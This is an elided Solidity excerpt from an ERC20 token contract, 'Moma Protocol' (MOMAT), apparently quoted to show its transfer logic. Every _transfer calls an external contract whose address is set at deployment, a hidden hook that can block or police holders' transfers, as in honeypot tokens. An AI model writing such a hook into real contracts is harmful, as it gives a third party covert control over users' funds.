...
interface tokenRecipient {
    ...
    function isGovernance(address _from,address _to, address _token)
    external
    returns (bool);
}
...
contract MOMAT is ERC20Burnable, Ownable {
    tokenRecipient spender;
    constructor(address _spender) public ERC20("Moma Protocol", "MOMAT") {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        if (address(spender) != address(0)) {
            spender.isGovernance(sender, recipient, address(this));
        }
